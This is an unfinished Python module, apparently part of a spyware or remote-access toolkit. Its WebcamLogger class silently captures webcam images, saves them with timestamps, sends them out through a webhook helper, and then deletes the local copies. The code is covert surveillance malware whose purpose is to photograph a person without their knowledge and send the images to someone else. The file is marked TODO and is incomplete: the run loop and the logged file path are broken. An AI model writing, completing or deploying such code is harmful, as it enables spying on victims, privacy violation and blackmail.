# TODO: Finish this
import cv2
import time
import os

from config import (
    LOG_DIRECTORY_PATH,
    WEBCAM_CAPTURE_INTERVAL_SEC,
)
from utils.logging_utils import log_error, log_info, timestamp
from utils.webhook_utils import send_log_files_in_directory
from utils.file_utils import clear_files_in_log_directory


class WebcamLogger:
    def __init__(self):
        self.logs_directory = "webcam"
        self.logs_directory_path = os.path.join(LOG_DIRECTORY_PATH, self.logs_directory)
        self.interval = WEBCAM_CAPTURE_INTERVAL_SEC

        self.running = False

    def log_picture(self):
        cam = cv2.VideoCapture(0)
        time.sleep(0.5)
        result, image = cam.read()
        cam.release()

        if result:
            cv2.imwrite(
                filename=os.path.join(self.logs_directory_path, f"{timestamp()}.png"),
                img=image,
            )
            log_info(
                f"Logged webcam picture to {os.path.join(self.logs_directory_path, f'{timestamp()}.png')}"
            )

    def send_logs(self):
        send_log_files_in_directory("`Sending webcam logs...`", self.logs_directory)
        clear_files_in_log_directory(self.logs_directory)
        log_info("Sent and cleared webcam log files.")

    def run(self):
        try:
            self.log_picture()
            time.sleep(self.interval)
        except Exception as e:
            self.running = False
            log_error(e)
